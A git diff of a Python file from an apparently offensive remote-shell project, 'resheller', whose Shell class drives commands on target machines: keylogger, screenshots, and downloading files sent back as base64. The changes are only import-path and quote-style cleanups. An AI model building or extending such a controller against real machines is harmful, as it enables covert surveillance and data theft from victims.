@@ -4,13 +4,12 @@ from os import path
 from pathlib import Path
 from time import strftime
 
-from lib.pipe import SafeSocket
-from lib.stdout import color
-from server.ps1 import Ps1
+from resheller.lib.pipe import SafeSocket
+from resheller.lib.stdout import color
+from resheller.src.server.ps1 import Ps1
 
 
 class Shell:
-
     def __init__(self, ips: list, targets: list, sessions) -> None:
         self.ips = ips
         self.targets = targets
@@ -39,7 +38,7 @@ class Shell:
             if self.log[:3] == "[!]":
                 color.b_red.print(self.log)
             else:
-                with open(logs, 'w') as log_file:
+                with open(logs, "w") as log_file:
                     log_file.write(self.log)
                 color.grn.print(f"Saved {logs}\n")
         elif cmd == "print":
@@ -57,9 +56,9 @@ class Shell:
                 else:
                     download = f"{download}.{count}"
                     break
-        with open(download, 'wb') as file:
+        with open(download, "wb") as file:
             file.write(b64decode(payload))
-        color.grn.print(f'Saved {download}\n')
+        color.grn.print(f"Saved {download}\n")
 
     def screenshot(self) -> None:
         _dir = self.make_dir("screenshots")
@@ -103,7 +102,7 @@ class Shell:
                 self.keylogger(cmd[:9])
             elif cmd[:8] == "download":
                 self.download_file(cmd[:9])
-            elif cmd == 'quit' or cmd == "exit":
+            elif cmd == "quit" or cmd == "exit":
                 if cmd == "exit":
                     self.exit_shell()
                 break
